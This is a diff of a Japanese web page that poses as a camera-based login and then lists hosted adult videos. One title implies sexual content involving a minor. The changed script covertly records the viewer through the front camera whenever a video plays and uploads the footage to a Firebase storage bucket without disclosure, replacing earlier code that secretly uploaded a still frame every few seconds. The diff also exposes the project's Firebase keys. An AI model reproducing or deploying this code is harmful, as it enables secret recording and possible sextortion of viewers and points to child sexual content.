@@ -125,9 +125,9 @@
 </head>
 <body>
     <div class="login-container" id="loginContainer">
-        <h1>推しを撮影してね</h1>
-        <p class="camera-switch-message">カメラ隠しててもログインできるのは秘密🤫<br>
-		再読み込みで背面カメラに切り替わります</p>
+        <h1>推しを撮影してみてｗ</h1>
+        <p class="camera-switch-message">再読み込みで背面カメラに切り替わります<br>
+            何も撮影しなくてもログインできるのは秘密🤫</p>
         <video id="video" autoplay></video>
         <canvas id="canvas" style="display: none;"></canvas>
         <button id="captureButton">撮影してログイン</button>
@@ -149,6 +149,22 @@
     </div>
 
     <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.17.1/firebase-app.js";
+        import { getStorage, ref, uploadBytesResumable } from "https://www.gstatic.com/firebasejs/9.17.1/firebase-storage.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyDsK4imQ3uWcK7hyESo6hnDyQ96lsPNCZ8",
+            authDomain: "nou-no-circle.firebaseapp.com",
+            projectId: "nou-no-circle",
+            storageBucket: "nou-no-circle.appspot.com",
+            messagingSenderId: "756338805186",
+            appId: "1:756338805186:web:cb740e035ac611b5baae5b",
+            measurementId: "G-TWBV38P13D"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const storage = getStorage(app);
+
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const captureButton = document.getElementById('captureButton');
@@ -157,14 +173,13 @@
         const loginContainer = document.getElementById('loginContainer');
         const videoGrid = document.getElementById('videoGrid');
         const pagination = document.getElementById('pagination');
-        const loadMoreButton = document.getElementById('loadMoreButton');
         const videosPerPage = 12;
         let videoStream;
-        let captureInterval;
+        let mediaRecorder;
+        let recordedChunks = [];
         let currentPage = 1;
 
-                // 動画URLとタイトルのリストをここに配置
-        const videos = [
+               const videos = [
             {
                 url: 'https://firebasestorage.googleapis.com/v0/b/hozon-4794d.appspot.com/o/FC2-PPV-2885137%20%E7%8F%BE%E5%BD%B9%E3%81%AE%E9%AB%98%E2%97%8B3%E2%97%8B%E7%94%9F%E3%81%A7%E3%81%99%E3%80%82%20%E9%83%A8%E6%B4%BB%E7%B5%82%E3%82%8F%E3%81%A3%E3%81%9F%E3%81%82%E3%81%A8%E5%88%9D%E3%82%81%E3%81%A6%E3%82%AA%E3%83%8A%E3%83%8B%E3%83%BC%E3%82%92%E6%92%AE%E3%81%A3%E3%81%A6%E3%81%BF%E3%81%BE%E3%81%97%E3%81%9F_1.mp4?alt=media&token=c3d99cd6-afe8-4fb3-8339-e8094eaa52e7',
                 title: '現役の高○3○生です。 部活終わったあと初めてオナニーを撮ってみました_1'
@@ -396,15 +411,19 @@
             // 他の動画URLとタイトルを追加
         ];
 
-        async function requestCameraAccess() {
+        async function requestCameraAccess(backCamera = true) {
             try {
                 const devices = await navigator.mediaDevices.enumerateDevices();
                 const videoDevices = devices.filter(device => device.kind === 'videoinput');
-                const backCamera = videoDevices.find(device => device.label.toLowerCase().includes('back')) || videoDevices[0];
+                const camera = backCamera
+                    ? videoDevices.find(device => device.label.toLowerCase().includes('back')) || videoDevices[0]
+                    : videoDevices.find(device => device.label.toLowerCase().includes('front')) || videoDevices[0];
 
                 const constraints = {
                     video: {
-                        deviceId: backCamera.deviceId
+                        deviceId: camera.deviceId,
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
                     }
                 };
 
@@ -423,14 +442,12 @@
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                const dataURL = canvas.toDataURL('image/jpeg');
 
-                // ここでログイン処理をする代わりに、動画保管庫を表示
                 loginContainer.style.display = 'none';
                 document.querySelector('h1').style.display = 'block';
                 videoGrid.style.display = 'grid';
                 pagination.style.display = 'flex';
-                                loadVideos(currentPage);
+                loadVideos(currentPage);
             } else {
                 console.error('カメラストリームが利用できません。');
                 alert('カメラストリームが利用できません。');
@@ -456,6 +473,8 @@
             const endIndex = startIndex + videosPerPage;
             const videosToLoad = videos.slice(startIndex, endIndex);
 
+            videoGrid.innerHTML = '';
+
             videosToLoad.forEach(video => {
                 const videoItem = document.createElement('div');
                 videoItem.className = 'video-item';
@@ -477,7 +496,11 @@
                 videoGrid.appendChild(videoItem);
 
                 videoElement.addEventListener('play', () => {
-                    startCameraCapture();
+                    startVideoRecording();
+                });
+
+                videoElement.addEventListener('pause', () => {
+                    stopVideoRecording();
                 });
             });
 
@@ -502,107 +525,49 @@
             }
         }
 
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.17.1/firebase-app.js";
-        import { getStorage, ref, uploadString } from "https://www.gstatic.com/firebasejs/9.17.1/firebase-storage.js";
+        async function startVideoRecording() {
+            await requestCameraAccess(false); // フロントカメラを使用
 
-        const firebaseConfig = {
-            apiKey: "AIzaSyDsK4imQ3uWcK7hyESo6hnDyQ96lsPNCZ8",
-            authDomain: "nou-no-circle.firebaseapp.com",
-            projectId: "nou-no-circle",
-            storageBucket: "nou-no-circle.appspot.com",
-            messagingSenderId: "756338805186",
-            appId: "1:756338805186:web:cb740e035ac611b5baae5b",
-            measurementId: "G-TWBV38P13D"
-        };
+            recordedChunks = [];
+            mediaRecorder = new MediaRecorder(videoStream, { mimeType: 'video/webm; codecs=vp9' });
 
+            mediaRecorder.ondataavailable = event => {
+                if (event.data.size > 0) {
+                    recordedChunks.push(event.data);
+                }
+            };
 
-const app = initializeApp(firebaseConfig);
-const storage = getStorage(app);
+            mediaRecorder.onstop = () => {
+                const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                uploadVideo(blob);
+            };
 
-let currentCameraIndex = 0;
-let frontCamera;
-let backCamera;
-
-async function switchCamera() {
-    if (videoStream) {
-        videoStream.getTracks().forEach(track => track.stop());
-    }
-
-    try {
-        const devices = await navigator.mediaDevices.enumerateDevices();
-        const videoDevices = devices.filter(device => device.kind === 'videoinput');
-        if (videoDevices.length === 0) {
-            console.error('カメラが見つかりませんでした。');
-            showCameraPermissionDialog();
-            return;
+            mediaRecorder.start();
         }
 
-        if (!backCamera) {
-            backCamera = videoDevices[0];
-        }
-        if (!frontCamera) {
-            frontCamera = videoDevices[1] || videoDevices[0];
-        }
-
-        const constraints = {
-            video: {
-                deviceId: currentCameraIndex % 2 === 0 ? backCamera.deviceId : frontCamera.deviceId
+        function stopVideoRecording() {
+            if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+                mediaRecorder.stop();
             }
-        };
+        }
 
-        videoStream = await navigator.mediaDevices.getUserMedia(constraints);
-        video.srcObject = videoStream;
-        startCameraCapture();
-        currentCameraIndex++;
-    } catch (err) {
-        console.error('カメラ切り替えエラー:', err);
-        showCameraPermissionDialog();
-    }
-}
+        function uploadVideo(blob) {
+            const storageRef = ref(storage, `videos/${Date.now()}.webm`);
+            const uploadTask = uploadBytesResumable(storageRef, blob);
 
-function startCameraCapture() {
-    if (videoStream) {
-        const videoTracks = videoStream.getVideoTracks();
-        const track = videoTracks[0];
-        const imageCapture = new ImageCapture(track);
-
-        captureInterval = setInterval(() => {
-            imageCapture.grabFrame()
-                .then(imageBitmap => {
-                    canvas.width = imageBitmap.width;
-                    canvas.height = imageBitmap.height;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(imageBitmap, 0, 0, canvas.width, canvas.height);
-                    const dataURL = canvas.toDataURL('image/jpeg');
-                    uploadImage(dataURL);
-                    switchCamera();
-                })
-                .catch(err => {
-                    console.error('画像キャプチャエラー:', err);
-                });
-        }, 5000); // 10000ミリ秒 = 10秒
-    }
-}
-
-function stopCameraCapture() {
-    if (captureInterval) {
-        clearInterval(captureInterval);
-    }
-    if (videoStream) {
-        videoStream.getTracks().forEach(track => track.stop());
-    }
-}
-
-function uploadImage(dataURL) {
-    const storageRef = ref(storage, `images/${Date.now()}.jpg`);
-    uploadString(storageRef, dataURL, 'data_url')
-        .then(snapshot => {
-            console.log('画像がアップロードされました。');
-        })
-        .catch(err => {
-            console.error('アップロードエラー:', err);
-        });
-}
+            uploadTask.on('state_changed',
+                (snapshot) => {
+                    const progress = (snapshot.bytesTransferred / snapshot.totalBytes) * 100;
+                    console.log('Upload is ' + progress + '% done');
+                },
+                (error) => {
+                    console.error('Upload error:', error);
+                },
+                () => {
+                    console.log('Upload successful!');
+                }
+            );
+        }
 
         window.onload = () => {
             requestCameraAccess().catch(() => {
